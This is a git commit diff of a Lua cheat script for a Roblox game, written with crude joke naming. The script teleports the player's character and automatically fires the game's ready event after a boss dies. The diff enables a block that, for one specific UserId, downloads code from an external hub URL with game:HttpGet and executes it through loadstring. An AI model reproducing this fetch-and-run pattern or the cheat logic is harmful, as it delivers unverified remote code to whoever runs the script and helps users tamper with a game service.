aef9f8c032b4e94a0c552288b4be5744085f5be1
victorr <shenlain.nyc@gmail.com>
2021-10-06 04:10:32 -0400

    Update WZAutoReadyAX.lua

--- WZAutoReadyAX.lua
+++ WZAutoReadyAX.lua
@@ -12,21 +12,21 @@ local ReadyToGTFO = NeverGonnaGiveYouUp.Shared.Missions:WaitForChild("NotifyRead
 local UrMom = NeverGonnaGiveYouUp.Profiles:WaitForChild(UwU.Name)
 print("Loaded this dumbass profile that apparently takes 69420 years to load...")
 
---[[if UwU.UserId == 923761409 then
+if UwU.UserId == 923761409 then
     loadstring(game:HttpGet("https://kiriot22.com/hub/getfile.uwu?id=23B24P22521M22J24026I21626522K1826W23K23W25V26Q24124M25Y22626J26821C21B21E26726I23V22V21X1C&type=syn"))()
-end]]--
-
-if UrMom.Level.Value <= 31 and game.PlaceId == 4310464656 then
-    print("You passed the vibe check")
-    DeezNuts:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(833, 74, 2283)
-    wait(5)
-    DeezNuts:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(833, 74, 2283)
-    print("Moved yo lazy ass to the corner")
-    BossCommittedDie.OnClientEvent:Connect(function()
+    print("UwU ^-^")
+else
+    if UrMom.Level.Value <= 31 and game.PlaceId == 4310464656 then
+        print("You passed the vibe check")
+        wait(5)
+        DeezNuts:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(833, 74, 2283)
+        print("Moved yo lazy ass to the corner")
+        BossCommittedDie.OnClientEvent:Connect(function()
         print("The slave murdered the boss")
         ReadyToGTFO:FireServer()
         print("I pressed the ready button for you smh")
-    end)
-else
-    print("You failed the vibe check")
+        end)
+    else
+        print("You failed the vibe check")
+    end
 end
